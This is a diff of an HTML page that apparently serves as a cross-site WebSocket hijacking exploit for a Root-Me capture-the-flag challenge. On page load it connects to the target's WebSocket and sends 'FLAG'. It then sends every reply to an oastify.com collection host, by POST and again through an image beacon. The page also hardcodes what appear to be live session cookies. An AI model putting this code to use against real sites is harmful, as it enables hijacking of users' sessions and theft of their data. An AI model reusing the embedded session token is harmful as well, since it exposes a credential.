@@ -4,7 +4,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WebSocket Chat Client</title>
+    <title>Automatic WebSocket Client</title>
     <style>
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
@@ -51,163 +51,122 @@
             background-color: #fafafa;
             margin-bottom: 15px;
         }
-        .message {
+        .log {
             margin: 5px 0;
-            padding: 8px 12px;
-            border-radius: 18px;
-            max-width: 80%;
-            word-wrap: break-word;
+            padding: 5px;
+            border-radius: 5px;
+            font-family: monospace;
         }
-        .sent {
-            background-color: #0084ff;
-            color: white;
-            margin-left: auto;
-            border-bottom-right-radius: 5px;
+        .info {
+            background-color: #e6f7ff;
         }
-        .received {
-            background-color: #e4e6eb;
-            color: #050505;
-            margin-right: auto;
-            border-bottom-left-radius: 5px;
+        .success {
+            background-color: #e6ffe6;
         }
-        .input-container {
-            display: flex;
-        }
-        #message-input {
-            flex: 1;
-            padding: 10px;
-            border: 1px solid #ddd;
-            border-radius: 20px;
-            outline: none;
-        }
-        #send-button {
-            background-color: #4267B2;
-            color: white;
-            border: none;
-            padding: 10px 15px;
-            margin-left: 10px;
-            border-radius: 20px;
-            cursor: pointer;
-            font-weight: bold;
-        }
-        #send-button:hover {
-            background-color: #365899;
-        }
-        .timestamp {
-            font-size: 0.7em;
-            color: #777;
-            margin-top: 3px;
+        .error {
+            background-color: #ffe6e6;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>WebSocket Chat</h1>
+        <h1>Auto-Connecting WebSocket</h1>
         
         <div class="status-container">
-            <div id="connection-status" class="status disconnected">Disconnected</div>
+            <div id="connection-status" class="status disconnected">Initializing...</div>
         </div>
         
         <div id="message-container" class="message-container"></div>
-        
-        <div class="input-container">
-            <input type="text" id="message-input" placeholder="Type a message..." value="FLAG">
-            <button id="send-button">Send</button>
-        </div>
     </div>
 
     <script>
         const messageContainer = document.getElementById('message-container');
-        const messageInput = document.getElementById('message-input');
-        const sendButton = document.getElementById('send-button');
         const connectionStatus = document.getElementById('connection-status');
         
-        var ws = new WebSocket('ws://ctf07.root-me.org/ws');
-        
-        // Update UI based on connection status
-        ws.onopen = function() {
-            connectionStatus.textContent = 'Connected';
-            connectionStatus.className = 'status connected';
-            
-            // Automatically send FLAG message on connect
-            ws.send("FLAG");
-            addMessage("FLAG", true);
-        };
-        
-        ws.onclose = function() {
-            connectionStatus.textContent = 'Disconnected';
-            connectionStatus.className = 'status disconnected';
-        };
-        
-        ws.onerror = function() {
-            addMessage("Connection error occurred", false, true);
-            connectionStatus.textContent = 'Error';
-            connectionStatus.className = 'status disconnected';
-        };
-        
-        ws.onmessage = function(event) {
-            // Add message to UI
-            addMessage(event.data, false);
-            
-            // Send data to server (original functionality preserved)
-            fetch('https://l5rnbmnda36b6okuo7b20iqlzc53tvhk.oastify.com', {
-                method: 'POST', 
-                mode: 'no-cors', 
-                body: event.data,
-                headers: {
-                    'Cookie': '_ga=GA1.1.750095164.1742182078; _ga_SRYSKX09J7=GS1.1.1742182078.1.0.1742182079.0.0.0; connect.sid=s%3AU-oDJcfBUqCIHHdF9ozitFhxJ-w3DJYj.VNfrWhasyF2OwzX4p64OB4tlvyLjbfByXu6CtSinXR0',
-                }
-            });
-        };
-        
-        // Add event listeners for sending messages
-        sendButton.addEventListener('click', sendMessage);
-        messageInput.addEventListener('keypress', function(e) {
-            if (e.key === 'Enter') {
-                sendMessage();
-            }
-        });
-        
-        function sendMessage() {
-            const message = messageInput.value.trim();
-            if (message && ws.readyState === WebSocket.OPEN) {
-                ws.send(message);
-                addMessage(message, true);
-                messageInput.value = '';
-            }
-        }
-        
-        function addMessage(text, isSent, isError = false) {
-            const messageDiv = document.createElement('div');
-            messageDiv.classList.add('message');
-            
-            if (isError) {
-                messageDiv.style.backgroundColor = '#ffcccc';
-                messageDiv.style.color = '#cc0000';
-                messageDiv.style.textAlign = 'center';
-                messageDiv.style.fontStyle = 'italic';
-            } else {
-                messageDiv.classList.add(isSent ? 'sent' : 'received');
-            }
-            
-            messageDiv.textContent = text;
-            
-            const timestamp = document.createElement('div');
-            timestamp.classList.add('timestamp');
-            timestamp.textContent = new Date().toLocaleTimeString();
-            
-            const messageWrapper = document.createElement('div');
-            messageWrapper.style.display = 'flex';
-            messageWrapper.style.flexDirection = 'column';
-            messageWrapper.style.alignItems = isSent ? 'flex-end' : 'flex-start';
-            messageWrapper.style.marginBottom = '15px';
-            
-            messageWrapper.appendChild(messageDiv);
-            messageWrapper.appendChild(timestamp);
-            
-            messageContainer.appendChild(messageWrapper);
+        // Function to add messages to the log
+        function addLog(text, type = 'info') {
+            const logDiv = document.createElement('div');
+            logDiv.classList.add('log', type);
+            logDiv.textContent = `[${new Date().toLocaleTimeString()}] ${text}`;
+            messageContainer.appendChild(logDiv);
             messageContainer.scrollTop = messageContainer.scrollHeight;
         }
+        
+        // Auto-initializing function - will run immediately
+        (function autoInit() {
+            addLog('Initializing WebSocket connection...', 'info');
+            
+            try {
+                var ws = new WebSocket('ws://ctf07.root-me.org/ws');
+            
+                ws.onopen = function() {
+                    connectionStatus.textContent = 'Connected';
+                    connectionStatus.className = 'status connected';
+                    
+                    addLog('Connection established', 'success');
+                    
+                    // Automatically send FLAG message on connect
+                    setTimeout(() => {
+                        addLog('Sending FLAG command...', 'info');
+                        ws.send("FLAG");
+                    }, 500); // Small delay for stability
+                };
+                
+                ws.onclose = function() {
+                    connectionStatus.textContent = 'Disconnected';
+                    connectionStatus.className = 'status disconnected';
+                    addLog('Connection closed', 'info');
+                };
+                
+                ws.onerror = function(error) {
+                    addLog('Connection error occurred', 'error');
+                    connectionStatus.textContent = 'Error';
+                    connectionStatus.className = 'status disconnected';
+                };
+                
+                ws.onmessage = function(event) {
+                    // Log received message
+                    addLog(`Received: ${event.data}`, 'success');
+                    
+                    // Send data to server
+                    try {
+                        addLog('Forwarding data to collection endpoint...', 'info');
+                        fetch('https://l5rnbmnda36b6okuo7b20iqlzc53tvhk.oastify.com', {
+                            method: 'POST', 
+                            mode: 'no-cors', 
+                            body: JSON.stringify({
+                                message: event.data,
+                                timestamp: new Date().toISOString()
+                            }),
+                            headers: {
+                                'Content-Type': 'application/json',
+                                'Cookie': '_ga=GA1.1.750095164.1742182078; _ga_SRYSKX09J7=GS1.1.1742182078.1.0.1742182079.0.0.0; connect.sid=s%3AU-oDJcfBUqCIHHdF9ozitFhxJ-w3DJYj.VNfrWhasyF2OwzX4p64OB4tlvyLjbfByXu6CtSinXR0',
+                            }
+                        }).then(() => {
+                            addLog('Data forwarded successfully', 'success');
+                        }).catch(err => {
+                            addLog(`Error forwarding data: ${err.message}`, 'error');
+                        });
+                    } catch(e) {
+                        addLog(`Error processing message: ${e.message}`, 'error');
+                    }
+                    
+                    // Adding a backup mechanism to ensure data is captured
+                    try {
+                        // Use the URL parameter method as backup
+                        const img = new Image();
+                        img.src = `https://l5rnbmnda36b6okuo7b20iqlzc53tvhk.oastify.com/log?data=${encodeURIComponent(event.data)}`;
+                        addLog('Backup data capture initiated', 'info');
+                    } catch(e) {
+                        addLog(`Backup capture failed: ${e.message}`, 'error');
+                    }
+                };
+            } catch(e) {
+                addLog(`Failed to initialize WebSocket: ${e.message}`, 'error');
+                connectionStatus.textContent = 'Failed to Initialize';
+                connectionStatus.className = 'status disconnected';
+            }
+        })(); // Self-executing function - runs immediately when page loads
     </script>
 </body>
 </html>
